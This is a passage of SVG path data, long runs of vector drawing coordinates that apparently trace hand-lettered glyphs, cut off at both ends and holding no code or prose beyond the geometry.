0-.067.034-.167.1-.3.2-.3.934-.45 2.2-.45.734 0 1.3-.067 1.7-.2.434-.167.884-.467 1.35-.9.6-.567.967-1.283 1.1-2.15.134-.867-.016-1.533-.45-2-.566-.567-1.883-.633-3.95-.2-2.066.4-3.25.983-3.55 1.75-.2.433-.366 2.217-.5 5.35l-.2 4.7 3 2.9 5.05.2c3.567.133 5.267.333 5.1.6-.133.267-1.9.4-5.3.4h-5.25l-3.75-3.65v-4.35c0-3.1.317-5.267.95-6.5.634-1.233 1.867-2.067 3.7-2.5ZM691.577 6.75c.466-.7.783-.533.95.5.133 1.1.183 3.733.15 7.9-.034 5.767-.167 9.317-.4 10.65-.7 3.9-1.334 6.133-1.9 6.7-.234.267-.467.367-.7.3-.2-.1-.584-.417-1.15-.95-.7-.667-1.484-1.783-2.35-3.35-.867-1.567-1.617-2.75-2.25-3.55-.767-.967-1.484-2.083-2.15-3.35-.634-1.3-.95-2.233-.95-2.8-.034-.633-.384-1.317-1.05-2.05-.667-.767-1.2-1.067-1.6-.9-.434.133-.65.417-.65.85s-.284 1.1-.85 2c-.367.6-.6 1.617-.7 3.05-.067 1.433-.1 5.317-.1 11.65 0 5.333-.034 8.917-.1 10.75-.067 1.867-.217 2.883-.45 3.05-.367.3-.65.367-.85.2-.2-.233-.284-4.05-.25-11.45.066-7.4.216-11.767.45-13.1.266-1.6.633-3.167 1.1-4.7.466-1.533.883-2.517 1.25-2.95.866-.867 1.7-.9 2.5-.1s1.483 1.783 2.05 2.95c.566 1.133.85 1.867.85 2.2 0 .233.616 1.267 1.85 3.1 1.233 1.8 1.916 2.917 2.05 3.35.1.367.366.783.8 1.25.433.467.65.883.65 1.25 0 .433.25.9.75 1.4.533.5.933.667 1.2.5.5-.3.85-1.467 1.05-3.5.2-2.067.333-5.483.4-10.25.033-6.7.166-10.233.4-10.6Zm6.382 8.9c.133-.133 1.533-.15 4.2-.05 2.867.1 4.967.517 6.3 1.25 1.333.733 2 1.833 2 3.3 0 .9.283 1.7.85 2.4.333.467.55 1.033.65 1.7.1.667.15 2 .15 4v1.1c0 1.8-.083 2.917-.25 3.35-.133.433-.683 1.083-1.65 1.95-.6.567-1.117 1.05-1.55 1.45l-1.8 1.75h-4.4c-2.067 0-3.4-.05-4-.15-.6-.133-1.25-.433-1.95-.9-1.267-.867-2.067-1.85-2.4-2.95-.333-1.133-.45-3.167-.35-6.1.1-2.833.35-4.75.75-5.75s1.167-1.583 2.3-1.75c.767-.067 1.417-.3 1.95-.7.533-.367 1.233-.533 2.1-.5.9 0 1.517.183 1.85.55.333.4.283.65-.15.75-.367.133-1.383.283-3.05.45-.667.033-1.167.067-1.5.1-.333.033-.7.133-1.1.3-.4.133-.683.25-.85.35-.167.1-.35.333-.55.7a4.15 4.15 0 0 0-.35.95c-.033.267-.083.75-.15 1.45-.067.7-.1 1.35-.1 1.95V34l1.25 1.2c.6.567 1.167.917 1.7 1.05.567.133 1.967.233 4.2.3l4.7.15 1.75-1.95c1.067-1.167 1.717-2.1 1.95-2.8.233-.733.367-2.25.4-4.55 0-1.433-.067-2.533-.2-3.3-.133-.8-.283-1.317-.45-1.55a13.134 13.134 0 0 1-.65-1.05c-.233-.5-.417-1.133-.55-1.9-.167-1-.483-1.6-.95-1.8-.433-.233-2.25-.517-5.45-.85-3.2-.367-4.8-.7-4.8-1-.033-.1.017-.2.15-.3Zm27.685 4.8c.5-1.067.9-1.45 1.2-1.15.2.333.266.65.2.95-.067.267-.2.617-.4 1.05-.2.4-.3.667-.3.8 0 .1 1 .15 3 .15 2.033 0 3.216.2 3.55.6.5.6.183.917-.95.95-.567.033-1.4 0-2.5-.1-1.567-.133-2.5-.167-2.8-.1-.267.067-.5.367-.7.9-.267.733-.4 2.867-.4 6.4 0 3.3.183 5.15.55 5.55.266.267.833.217 1.7-.15.633-.3 1.05-.317 1.25-.05.233.367.116.733-.35 1.1-.467.333-1.05.5-1.75.5-.834 0-1.434-.2-1.8-.6-.367-.4-.6-1.133-.7-2.2-.1-1.067-.134-2.833-.1-5.3l.15-6.05-5.75-.2c-3.934-.133-5.817-.35-5.65-.65.166-.267 2.133-.467 5.9-.6l5.9-.2.75-1.6ZM758.085 9.6l.4-1.05.6.9c.3.433.683.7 1.15.8.5.1 1.083.183 1.75.25.666.033 1.25.2 1.75.5.466.233 1.25.433 2.35.6 1.1.133 2.166.55 3.2 1.25.9.633 1.433 1.1 1.6 1.4.166.3.25 1.033.25 2.2 0 1.567-.25 2.733-.75 3.5-.6.9-1.4 1.717-2.4 2.45-1 .733-1.917 1.167-2.75 1.3-2.4.467-2.117.933.85 1.4.333.067.7.133 1.1.2.9.1 1.716.45 2.45 1.05.733.6 1.45 1.517 2.15 2.75l1.05 1.75-.85 2.85c-.567 1.867-.867 2.983-.9 3.35 0 .567-.45 1.267-1.35 2.1-.867.8-1.717 1.3-2.55 1.5a9.433 9.433 0 0 0-3.1 1.45l-2.3 1.7c-.634.467-1.067.583-1.3.35-.167-.167-.35-2.133-.55-5.9-.167-3.767-.367-7.867-.6-12.3-.2-4.433-.434-7.3-.7-8.6-.4-2.067-.634-3.5-.7-4.3-.067-.567-.184-.9-.35-1-.134-.133-.517-.167-1.15-.1-.867.067-1.3-.05-1.3-.35s.416-.533 1.25-.7c.866-.167 1.433-.6 1.7-1.3Zm10.9 4.4c-.867-.8-2.567-1.467-5.1-2-2.5-.533-3.967-.567-4.4-.1-.267.267-.334 1.367-.2 3.3.166 1.9.466 3.633.9 5.2.166.6.283 1.017.35 1.25.066.233.166.517.3.85.166.333.266.55.3.65.066.1.2.2.4.3.233.1.4.15.5.15.133-.033.383-.083.75-.15.4-.1.716-.2.95-.3.266-.1.683-.25 1.25-.45 2.933-1.1 4.533-3.033 4.8-5.8.066-.867.05-1.467-.05-1.8-.067-.333-.317-.7-.75-1.1Zm-1.9 12.45c-1.267-.333-2.634-.5-4.1-.5h-2.25l.2 8c.133 5.333.283 8.083.45 8.25.133.1.366.033.7-.2.333-.267.7-.55 1.1-.85.4-.3.7-.45.9-.45.4 0 1.25-.35 2.55-1.05 1.3-.7 2.15-1.267 2.55-1.7.5-.567.95-1.483 1.35-2.75.4-1.267.6-2.433.6-3.5 0-2.8-1.35-4.55-4.05-5.25Zm6.751-7.5c0-.533.117-.8.35-.8.233 0 .783.667 1.65 2 .867 1.3 1.3 2.133 1.3 2.5 0 .7.283.667.85-.1.267-.333.55-.8.85-1.4 1.133-2.233 2-2.417 2.6-.55.2.567.4.967.6 1.2.233.2.567.333 1 .4.767.1 1.3 0 1.6-.3.333-.333.6-.467.8-.4.2.067.3.317.3.75 0 .5-.267.9-.8 1.2-.5.3-1.167.45-2 .45-.533 0-1-.133-1.4-.4-.4-.3-.667-.6-.8-.9-.133-.3-.333-.5-.6-.6-.233-.133-.483-.05-.75.25-.4.4-.717 2.067-.95 5-.2 2.933-.4 4.617-.6 5.05-.233.4-.4 1.2-.5 2.4-.1 1.2-.217 2.267-.35 3.2-.133.9-.367 1.35-.7 1.35-.267 0-.433-.55-.5-1.65-.067-1.1-.1-3.6-.1-7.5 0-5.533-.117-8.567-.35-9.1-.067-.267-.267-.5-.6-.7a2.182 2.182 0 0 1-.65-.6c-.167-.3-.25-.55-.25-.75Zm17.141-3.3c.133-.133 1.533-.15 4.2-.05 2.866.1 4.966.517 6.3 1.25 1.333.733 2 1.833 2 3.3 0 .9.283 1.7.85 2.4.333.467.55 1.033.65 1.7.1.667.15 2 .15 4v1.1c0 1.8-.084 2.917-.25 3.35-.134.433-.684 1.083-1.65 1.95-.6.567-1.117 1.05-1.55 1.45l-1.8 1.75h-4.4c-2.067 0-3.4-.05-4-.15-.6-.133-1.25-.433-1.95-.9-1.267-.867-2.067-1.85-2.4-2.95-.334-1.133-.45-3.167-.35-6.1.1-2.833.35-4.75.75-5.75s1.166-1.583 2.3-1.75c.766-.067 1.416-.3 1.95-.7.533-.367 1.233-.533 2.1-.5.9 0 1.516.183 1.85.55.333.4.283.65-.15.75-.367.133-1.384.283-3.05.45-.667.033-1.167.067-1.5.1-.334.033-.7.133-1.1.3-.4.133-.684.25-.85.35-.167.1-.35.333-.55.7a4.11 4.11 0 0 0-.35.95c-.034.267-.084.75-.15 1.45-.067.7-.1 1.35-.1 1.95V34l1.25 1.2c.6.567 1.166.917 1.7 1.05.566.133 1.966.233 4.2.3l4.7.15 1.75-1.95c1.066-1.167 1.716-2.1 1.95-2.8.233-.733.366-2.25.4-4.55 0-1.433-.067-2.533-.2-3.3-.134-.8-.284-1.317-.45-1.55a12.847 12.847 0 0 1-.65-1.05c-.234-.5-.417-1.133-.55-1.9-.167-1-.484-1.6-.95-1.8-.434-.233-2.25-.517-5.45-.85-3.2-.367-4.8-.7-4.8-1-.034-.1.016-.2.15-.3Zm15.134-5.8c0-.467.117-.683.35-.65.367.067.617.467.75 1.2.034.067.05.133.05.2.067.667.217 1.517.45 2.55.267 1 .467 2.317.6 3.95.167 1.633.25 3.867.25 6.7 0 4.333.2 6.767.6 7.3.3.4.534.567.7.5.167-.067.55-.45 1.15-1.15.534-.6 1.017-1.35 1.45-2.25.434-.933.784-1.667 1.05-2.2.267-.567.5-.85.7-.85.134 0 .217.05.25.15.067.067.084.217.05.45 0 .233-.05.55-.15.95-.066.367-.183.867-.35 1.5-.1.367-.5.933-1.2 1.7-.7.767-1.383 1.483-2.05 2.15-.633.633-.95 1-.95 1.1 0 .067.15.133.45.2.3.033.684.2 1.15.5.467.267.834.717 1.1 1.35.267.633.517 1.033.75 1.2.234.133.734.2 1.5.2 1.134 0 1.95-.217 2.45-.65.4-.3.717-.45.95-.45.267-.033.384.1.35.4 0 .267-.183.583-.55.95-.366.4-.75.667-1.15.8-.4.133-1.033.2-1.9.2-1 0-1.65-.067-1.95-.2-.3-.167-.65-.583-1.05-1.25-.533-.867-1.083-1.333-1.65-1.4-.566-.067-1.016.3-1.35 1.1-.266.733-.316 2.017-.15 3.85.234 2.333.067 3.75-.5 4.25-.166.1-.333.1-.5 0-.266-.167-.4-1.633-.4-4.4 0-1.633-.05-2.783-.15-3.45-.1-.667-.283-1.15-.55-1.45-.3-.333-.45-.583-.45-.75 0-.167.15-.417.45-.75.3-.333.484-1.05.55-2.15.1-1.133.15-3.6.15-7.4 0-5.833-.216-9.5-.65-11-.4-1.5-.6-2.5-.6-3Zm18.029 9.95c.767-.2 1.834-.25 3.2-.15 1.4.067 2.234.233 2.5.5.267.267.467.983.6 2.15.1.8.067 1.4-.1 1.8-.133.367-.5.9-1.1 1.6-.566.633-1.083 1.083-1.55 1.35-.433.233-1.116.433-2.05.6-2 .3-2.933.117-2.8-.55 0-.067.034-.167.1-.3.2-.3.934-.45 2.2-.45.734 0 1.3-.067 1.7-.2.434-.167.884-.467 1.35-.9.6-.567.967-1.283 1.1-2.15.134-.867-.016-1.533-.45-2-.566-.567-1.883-.633-3.95-.2-2.066.4-3.25.983-3.55 1.75-.2.433-.366 2.217-.5 5.35l-.2 4.7 3 2.9 5.05.2c3.567.133 5.267.333 5.1.6-.133.267-1.9.4-5.3.4h-5.25l-3.75-3.65V28.8c0-3.1.317-5.267.95-6.5.634-1.233 1.867-2.067 3.7-2.5ZM690.365 65.05c.367-.433.75-.533 1.15-.3.4.233.733.75 1 1.55a9.852 9.852 0 0 0 1 1.95c.467.667.867 1.217 1.2 1.65.333.4.5.683.5.85 0 .167.133.45.4.85.267.367.583.9.95 1.6.4.7.7 1.467.9 2.3.2.867.4 1.433.6 1.7.2.233.617.383 1.25.45 1 .167 1.5.433 1.5.8.033.3-.317.45-1.05.45-.833 0-1.317.117-1.45.35-.067.133-.017.5.15 1.1.2.6.467 1.517.8 2.75.367 1.2.633 2.45.8 3.75.3 2.1.6 3.433.9 4 .267.5.333.967.2 1.4-.133.4-.417.6-.85.6-.4 0-.6-.45-.6-1.35 0-1.1-.283-3-.85-5.7s-1.1-4.667-1.6-5.9c-.167-.433-.5-.683-1-.75-.467-.067-1.867-.05-4.2.05-4.3.133-7.2.283-8.7.45-1.467.167-2.267.433-2.4.8-.167.467-.617 1.117-1.35 1.95-.667.7-1.45 1.867-2.35 3.5-.9 1.633-1.35 2.7-1.35 3.2 0 .267-.167.667-.5 1.2-.3.5-.633.933-1 1.3s-.617.5-.75.4c-.1-.133.2-1.067.9-2.8.733-1.767 1.333-3.017 1.8-3.75.1-.133.4-.7.9-1.7.533-1.033.983-1.7 1.35-2 .233-.2.517-.583.85-1.15a80.36 80.36 0 0 0 1.1-1.75c.4-.6 1.05-1.333 1.95-2.2.933-.867 2.017-1.683 3.25-2.45.5-.333.917-.667 1.25-1 .333-.367.55-.65.65-.85.133-.233.283-.6.45-1.1.2-.533.367-.917.5-1.15.167-.4.433-1.267.8-2.6.4-1.333.717-2.15.95-2.45Zm-.1 3.45c0 .467-.133.867-.4 1.2-.267.3-.4.767-.4 1.4 0 .633-.4 1.483-1.2 2.55-.767 1.033-1.383 1.567-1.85 1.6-.2 0-.6.233-1.2.7a12.5 12.5 0 0 0-1.55 1.4c-.433.5-.583.783-.45.85.2.1 2.417.067 6.65-.1l6.35-.2.15-1.6c.033-.767-.05-1.383-.25-1.85a4.955 4.955 0 0 0-.75-1.35c-.333-.467-.567-.917-.7-1.35-.133-.4-.517-.983-1.15-1.75-.6-.8-1.217-1.483-1.85-2.05-.6-.6-.95-.85-1.05-.75-.233.233-.35.667-.35 1.3Zm13.964 21.05c.167 0 .517-.367 1.05-1.1a18.947 18.947 0 0 1 1.85-2.25c.7-.767 1.367-1.15 2-1.15.667 0 1.65.65 2.95 1.95.934.967 1.5 1.683 1.7 2.15.234.433.417 1.383.55 2.85.2 1.967.567 3.217 1.1 3.75.5.533.9.783 1.2.75.3-.067.584-.433.85-1.1.367-.933.634-1.55.8-1.85.2-.333.434-.55.7-.65.4-.133.534.133.4.8-.266 1.167-.85 2.283-1.75 3.35-.366.467-.683.7-.95.7-.9 0-1.65-.55-2.25-1.65-.566-1.133-1.183-3.183-1.85-6.15-.133-.6-.666-1.35-1.6-2.25-.933-.933-1.65-1.4-2.15-1.4-.733 0-1.683 1-2.85 3-1.133 1.967-1.783 3.733-1.95 5.3-.2 2-.433 3-.7 3-.1 0-.25-.083-.45-.25-.433-.333-.65-2.083-.65-5.25s.217-5.55.65-7.15c.4-1.6.6-2.783.6-3.55 0-.767.084-1.233.25-1.4.434-.4.717-.233.85.5.067.4.05.883-.05 1.45-.166 1.067-.3 2.2-.4 3.4-.1 1.2-.15 2.2-.15 3 .034.8.117 1.2.25 1.2Zm16.263-6.15c-.033-.867-.05-1.55-.05-2.05 0-.533.017-.95.05-1.25.034-.3.084-.5.15-.6.067-.1.15-.133.25-.1.334.1.667 1.467 1 4.1.334 2.633.567 4.067.7 4.3.3.433.9.6 1.8.5.9-.1 1.584-.4 2.05-.9.934-1.067 1.65-2.167 2.15-3.3.5-1.167.817-2.05.95-2.65.134-.633.3-.983.5-1.05.1 0 .184.383.25 1.15.067.733.117 1.833.15 3.3.067 1.433.117 3.183.15 5.25l.1 9.75-1.2 1.2c-1 1-1.933 1.383-2.8 1.15-.833-.233-1.3-1-1.4-2.3-.1-.867.017-1.3.35-1.3.234 0 .417.3.55.9.1.367.234.6.4.7.2.133.55.2 1.05.2.534 0 .867-.1 1-.3.167-.167.317-.683.45-1.55.1-.667.184-2 .25-4 .067-2.033.084-3.917.05-5.65 0-1.733-.05-2.6-.15-2.6-.133 0-.75.533-1.85 1.6-.966 1-1.9 1.55-2.8 1.65-.866.1-1.783-.217-2.75-.95-.6-.5-.966-.967-1.1-1.4-.1-.467-.183-1.733-.25-3.8ZM744.023 71c.133-.033.317-.067.55-.1.233-.067.383-.1.45-.1s.167.017.3.05c.133 0 .25.033.35.1.1.033.233.117.4.25.333.233.567.933.7 2.1.167 1.167.35 3.267.55 6.3.233 3.033.467 5.717.7 8.05.3 2.733.3 4.233 0 4.5-.267.267-.467.133-.6-.4-.167-.767-.517-4.017-1.05-9.75-.533-6.267-.933-9.533-1.2-9.8-.533-.533-1.067-.017-1.6 1.55-.9 2.667-1.3 6.033-1.2 10.1v.9c.133 2.4.05 3.6-.25 3.6-.267 0-.65-.983-1.15-2.95-.5-1.967-.75-3.483-.75-4.55 0-1-.133-1.833-.4-2.5-.167-.467-.367-.717-.6-.75-.233-.067-.85 0-1.85.2-1.5.267-2.433.833-2.8 1.7-.367.833-.5 2.633-.4 5.4.1 2.9-.05 4.25-.45 4.05-.533-.3-1.1-2.9-1.7-7.8V81c-.533-4.533-.4-6.8.4-6.8.433 0 .683.55.75 1.65.067.767.133 1.333.2 1.7s.15.6.25.7c.1.1.25.083.45-.05s.4-.3.6-.5c.233-.2.55-.4.95-.6a4.03 4.03 0 0 1 1.35-.45 59.83 59.83 0 0 1 1.05-.2c.367-.067.633-.117.8-.15.2-.033.4-.05.6-.05.2-.033.35-.033.45 0 .1 0 .2.033.3.1.1.067.183.15.25.25s.133.25.2.45c.433 1.133.783 1.367 1.05.7.133-.367.2-.933.2-1.7 0-1.367.2-2.517.6-3.45.4-.933.917-1.467 1.55-1.6Zm9.478-.35c.133-.133 1.533-.15 4.2-.05 2.867.1 4.967.517 6.3 1.25 1.333.733 2 1.833 2 3.3 0 .9.283 1.7.85 2.4.333.467.55 1.033.65 1.7.1.667.15 2 .15 4v1.1c0 1.8-.083 2.917-.25 3.35-.133.433-.683 1.083-1.65 1.95-.6.567-1.117 1.05-1.55 1.45l-1.8 1.75h-4.4c-2.067 0-3.4-.05-4-.15-.6-.133-1.25-.433-1.95-.9-1.267-.867-2.067-1.85-2.4-2.95-.333-1.133-.45-3.167-.35-6.1.1-2.833.35-4.75.75-5.75s1.167-1.583 2.3-1.75c.767-.067 1.417-.3 1.95-.7.533-.367 1.233-.533 2.1-.5.9 0 1.517.183 1.85.55.333.4.283.65-.15.75-.367.133-1.383.283-3.05.45-.667.033-1.167.067-1.5.1-.333.033-.7.133-1.1.3-.4.133-.683.25-.85.35-.167.1-.35.333-.55.7a4.15 4.15 0 0 0-.35.95c-.033.267-.083.75-.15 1.45-.067.7-.1 1.35-.1 1.95V89l1.25 1.2c.6.567 1.167.917 1.7 1.05.567.133 1.967.233 4.2.3l4.7.15 1.75-1.95c1.067-1.167 1.717-2.1 1.95-2.8.233-.733.367-2.25.4-4.55 0-1.433-.067-2.533-.2-3.3-.133-.8-.283-1.317-.45-1.55a13.134 13.134 0 0 1-.65-1.05c-.233-.5-.417-1.133-.55-1.9-.167-1-.483-1.6-.95-1.8-.433-.233-2.25-.517-5.45-.85-3.2-.367-4.8-.7-4.8-1-.033-.1.017-.2.15-.3Zm15.135 3.3c0-.533.116-.8.35-.8.233 0 .783.667 1.65 2 .866 1.3 1.3 2.133 1.3 2.5 0 .7.283.667.85-.1.266-.333.55-.8.85-1.4 1.133-2.233 2-2.417 2.6-.55.2.567.4.967.6 1.2.233.2.566.333 1 .4.766.1 1.3 0 1.6-.3.333-.333.6-.467.8-.4.2.067.3.317.3.75 0 .5-.267.9-.8 1.2-.5.3-1.167.45-2 .45-.534 0-1-.133-1.4-.4-.4-.3-.667-.6-.8-.9-.134-.3-.334-.5-.6-.6-.234-.133-.484-.05-.75.25-.4.4-.717 2.067-.95 5-.2 2.933-.4 4.617-.6 5.05-.234.4-.4 1.2-.5 2.4-.1 1.2-.217 2.267-.35 3.2-.134.9-.367 1.35-.7 1.35-.267 0-.434-.55-.5-1.65-.067-1.1-.1-3.6-.1-7.5 0-5.533-.117-8.567-.35-9.1-.067-.267-.267-.5-.6-.7a2.17 2.17 0 0 1-.65-.6c-.167-.3-.25-.55-.25-.75Zm17.54.85c.767-.2 1.834-.25 3.2-.15 1.4.067 2.234.233 2.5.5.267.267.467.983.6 2.15.1.8.067 1.4-.1 1.8-.133.367-.5.9-1.1 1.6-.566.633-1.083 1.083-1.55 1.35-.433.233-1.116.433-2.05.6-2 .3-2.933.117-2.8-.55 0-.067.034-.167.1-.3.2-.3.934-.45 2.2-.45.734 0 1.3-.067 1.7-.2.434-.167.884-.467 1.35-.9.6-.567.967-1.283 1.1-2.15.134-.867-.016-1.533-.45-2-.566-.567-1.883-.633-3.95-.2-2.066.4-3.25.983-3.55 1.75-.2.433-.366 2.217-.5 5.35l-.2 4.7 3 2.9 5.05.2c3.567.133 5.267.333 5.1.6-.133.267-1.9.4-5.3.4h-5.25l-3.75-3.65V83.8c0-3.1.317-5.267.95-6.5.634-1.233 1.867-2.067 3.7-2.5Zm32.38 18.45c.566-.467.95-.717 1.15-.75.2-.033.516.067.95.3.4.267.45.633.15 1.1-.834 1.4-1.667 1.683-2.5.85-.367-.333-.534-.567-.5-.7.033-.167.283-.433.75-.8Zm.65-15.8c.566-.433 1.116-.6 1.65-.5.533.1.8.4.8.9 0 .533-.367.9-1.1 1.1-.734.2-1.267.083-1.6-.35-.234-.233-.334-.417-.3-.55.033-.167.216-.367.55-.6Zm6.284-10c.233-.367.583-.483 1.05-.35.5.133 1.266.55 2.3 1.25.766.5 1.333.917 1.7 1.25.366.333.7.7 1 1.1.333.4.55.933.65 1.6.133.667.233 1.383.3 2.15.066.733.133 1.85.2 3.35.066 2.3.166 3.933.3 4.9.133.933.333 1.617.6 2.05.533.8.783 2.25.75 4.35-.034 2.067-.317 3.65-.85 4.75-.4.867-.667 1.6-.8 2.2-.134.567-.484 1.4-1.05 2.5-.667 1.367-1 2.217-1 2.55-.034.6-.534 1.3-1.5 2.1a10.445 10.445 0 0 1-3.2 1.9c-2 .7-3.067.983-3.2.85-.067-.067-.1-.2-.1-.4 0-.4.716-.8 2.15-1.2 1.466-.4 2.633-1.083 3.5-2.05.9-.933 1.8-2.45 2.7-4.55.666-1.633 1.066-2.85 1.2-3.65.166-.8.25-2.317.25-4.55 0-2.5-.2-4.8-.6-6.9a59.488 59.488 0 0 1-.75-6.7c-.167-3.167-.317-4.817-.45-4.95-.434-.433-1.15-.933-2.15-1.5-.967-.567-1.617-.85-1.95-.85-.467 0-.817-.117-1.05-.35-.2-.267-.2-.55 0-.85Zm-629.161 151.3c.467-.7.784-.533.95.5.134 1.1.184 3.733.15 7.9-.033 5.767-.166 9.317-.4 10.65-.7 3.9-1.333 6.133-1.9 6.7-.233.267-.466.367-.7.3-.2-.1-.583-.417-1.15-.95-.7-.667-1.483-1.783-2.35-3.35-.866-1.567-1.616-2.75-2.25-3.55-.766-.967-1.483-2.083-2.15-3.35-.633-1.3-.95-2.233-.95-2.8-.033-.633-.383-1.317-1.05-2.05-.666-.767-1.2-1.067-1.6-.9-.433.133-.65.417-.65.85s-.283 1.1-.85 2c-.366.6-.6 1.617-.7 3.05-.066 1.433-.1 5.317-.1 11.65 0 5.333-.033 8.917-.1 10.75-.066 1.867-.216 2.883-.45 3.05-.366.3-.65.367-.85.2-.2-.233-.283-4.05-.25-11.45.067-7.4.217-11.767.45-13.1.267-1.6.634-3.167 1.1-4.7.467-1.533.884-2.517 1.25-2.95.867-.867 1.7-.9 2.5-.1s1.484 1.783 2.05 2.95c.567 1.133.85 1.867.85 2.2 0 .233.617 1.267 1.85 3.1 1.234 1.8 1.917 2.917 2.05 3.35.1.367.367.783.8 1.25.434.467.65.883.65 1.25 0 .433.25.9.75 1.4.534.5.934.667 1.2.5.5-.3.85-1.467 1.05-3.5.2-2.067.334-5.483.4-10.25.034-6.7.167-10.233.4-10.6Zm6.383 8.9c.133-.133 1.533-.15 4.2-.05 2.867.1 4.967.517 6.3 1.25 1.333.733 2 1.833 2 3.3 0 .9.283 1.7.85 2.4.333.467.55 1.033.65 1.7.1.667.15 2 .15 4v1.1c0 1.8-.083 2.917-.25 3.35-.133.433-.683 1.083-1.65 1.95-.6.567-1.117 1.05-1.55 1.45l-1.8 1.75h-4.4c-2.067 0-3.4-.05-4-.15-.6-.133-1.25-.433-1.95-.9-1.267-.867-2.067-1.85-2.4-2.95-.333-1.133-.45-3.167-.35-6.1.1-2.833.35-4.75.75-5.75s1.167-1.583 2.3-1.75c.767-.067 1.417-.3 1.95-.7.533-.367 1.233-.533 2.1-.5.9 0 1.517.183 1.85.55.333.4.283.65-.15.75-.367.133-1.383.283-3.05.45-.667.033-1.167.067-1.5.1-.333.033-.7.133-1.1.3-.4.133-.683.25-.85.35-.167.1-.35.333-.55.7a4.15 4.15 0 0 0-.35.95c-.033.267-.083.75-.15 1.45-.067.7-.1 1.35-.1 1.95v7.4l1.25 1.2c.6.567 1.167.917 1.7 1.05.567.133 1.967.233 4.2.3l4.7.15 1.75-1.95c1.067-1.167 1.717-2.1 1.95-2.8.233-.733.367-2.25.4-4.55 0-1.433-.067-2.533-.2-3.3-.133-.8-.283-1.317-.45-1.55a13.024 13.024 0 0 1-.65-1.05c-.233-.5-.417-1.133-.55-1.9-.167-1-.483-1.6-.95-1.8-.433-.233-2.25-.517-5.45-.85-3.2-.367-4.8-.7-4.8-1-.033-.1.017-.2.15-.3Zm27.685 4.8c.5-1.067.9-1.45 1.2-1.15.2.333.266.65.2.95-.067.267-.2.617-.4 1.05-.2.4-.3.667-.3.8 0 .1 1 .15 3 .15 2.033 0 3.216.2 3.55.6.5.6.183.917-.95.95-.567.033-1.4 0-2.5-.1-1.567-.133-2.5-.167-2.8-.1-.267.067-.5.367-.7.9-.267.733-.4 2.867-.4 6.4 0 3.3.183 5.15.55 5.55.266.267.833.217 1.7-.15.633-.3 1.05-.317 1.25-.05.233.367.116.733-.35 1.1-.467.333-1.05.5-1.75.5-.834 0-1.434-.2-1.8-.6-.367-.4-.6-1.133-.7-2.2-.1-1.067-.134-2.833-.1-5.3l.15-6.05-5.75-.2c-3.934-.133-5.817-.35-5.65-.65.166-.267 2.133-.467 5.9-.6l5.9-.2.75-1.6Zm35.541 21.5c.366 0 .716-.133 1.05-.4.333-.3 1.016-.45 2.05-.45 2.333 0 3.766-1.15 4.3-3.45.3-1.333.416-3.15.35-5.45-.034-2.333-.217-3.917-.55-4.75l-.6-1.5h-3.45c-2.3 0-3.6-.183-3.9-.55-.334-.4-.367-1.25-.1-2.55.3-1.3.733-2.267 1.3-2.9.4-.433.783-.7 1.15-.8.366-.1 1-.133 1.9-.1 1.366.1 2.05.35 2.05.75s-.684.65-2.05.75c-1.167.067-1.967.3-2.4.7-.434.4-.65 1.1-.65 2.1v1.35h3.2c1.6 0 2.683.117 3.25.35.6.233.9.65.9 1.25 0 .367.266.9.8 1.6.766.967 1.033 2.783.8 5.45-.234 2.667-.867 4.933-1.9 6.8-.6 1.1-2.767 1.983-6.5 2.65-3.234.533-5.017.267-5.35-.8-.034-.133-.267-.683-.7-1.65-.434-.967-.734-1.9-.9-2.8-.1-.7-.117-1.183-.05-1.45.066-.267.266-.5.6-.7 1.333-.7 2.533-.517 3.6.55.433.433.7.867.8 1.3.133.433.2 1.167.2 2.2 0 1.1.05 1.8.15 2.1.1.267.316.4.65.4Zm-2.4-2.65c-.1-1.433-.267-2.283-.5-2.55a1.243 1.243 0 0 0-.9-.5c-.334-.067-.6 0-.8.2-.234.233-.234.867 0 1.9.266 1.033.616 1.867 1.05 2.5.533.767.883 1.067 1.05.9.2-.2.233-1.017.1-2.45ZM276.44 241c0-1.667.017-2.967.05-3.9.034-.967.084-1.783.15-2.45.067-.667.167-1.1.3-1.3.134-.2.3-.233.5-.1.234.133.317 1.183.25 3.15l-.2 5.9c-.066 2 .084 3.7.45 5.1.034.067.067.15.1.25.2.6.417 1.033.65 1.3.267.233.9.433 1.9.6 1 .167 2.567.25 4.7.25.767 0 1.384-.017 1.85-.05a4.1 4.1 0 0 0 1.3-.3c.434-.167.75-.367.95-.6.2-.233.384-.617.55-1.15a7 7 0 0 0 .4-1.7c.1-.6.217-1.433.35-2.5.3-2.933.284-4.667-.05-5.2-.2-.267-.35-.667-.45-1.2-.066-.533-.083-1-.05-1.4.067-.4.2-.6.4-.6.534 0 .884.467 1.05 1.4.2.9.284 2.7.25 5.4l-.05 5.5-3.1 3.8-4.65-.3a96.197 96.197 0 0 1-2.45-.1 23.866 23.866 0 0 1-1.85-.3c-.633-.167-1.1-.317-1.4-.45-.266-.133-.566-.4-.9-.8-.3-.433-.5-.817-.6-1.15-.066-.333-.15-.9-.25-1.7-.1-.833-.15-1.6-.15-2.3V241Zm16.407-10.05c0-.533.116-.8.35-.8.233 0 .783.667 1.65 2 .866 1.3 1.3 2.133 1.3 2.5 0 .7.283.667.85-.1.266-.333.55-.8.85-1.4 1.133-2.233 2-2.417 2.6-.55.2.567.4.967.6 1.2.233.2.566.333 1 .4.766.1 1.3 0 1.6-.3.333-.333.6-.467.8-.4.2.067.3.317.3.75 0 .5-.267.9-.8 1.2-.5.3-1.167.45-2 .45-.534 0-1-.133-1.4-.4-.4-.3-.667-.6-.8-.9-.134-.3-.334-.5-.6-.6-.234-.133-.484-.05-.75.25-.4.4-.717 2.067-.95 5-.2 2.933-.4 4.617-.6 5.05-.234.4-.4 1.2-.5 2.4-.1 1.2-.217 2.267-.35 3.2-.134.9-.367 1.35-.7 1.35-.267 0-.434-.55-.5-1.65-.067-1.1-.1-3.6-.1-7.5 0-5.533-.117-8.567-.35-9.1-.067-.267-.267-.5-.6-.7a2.163 2.163 0 0 1-.65-.6c-.167-.3-.25-.55-.25-.75Zm17.54.85c.767-.2 1.834-.25 3.2-.15 1.4.067 2.234.233 2.5.5.267.267.467.983.6 2.15.1.8.067 1.4-.1 1.8-.133.367-.5.9-1.1 1.6-.566.633-1.083 1.083-1.55 1.35-.433.233-1.116.433-2.05.6-2 .3-2.933.117-2.8-.55 0-.067.034-.167.1-.3.2-.3.934-.45 2.2-.45.734 0 1.3-.067 1.7-.2.434-.167.884-.467 1.35-.9.6-.567.967-1.283 1.1-2.15.134-.867-.016-1.533-.45-2-.566-.567-1.883-.633-3.95-.2-2.066.4-3.25.983-3.55 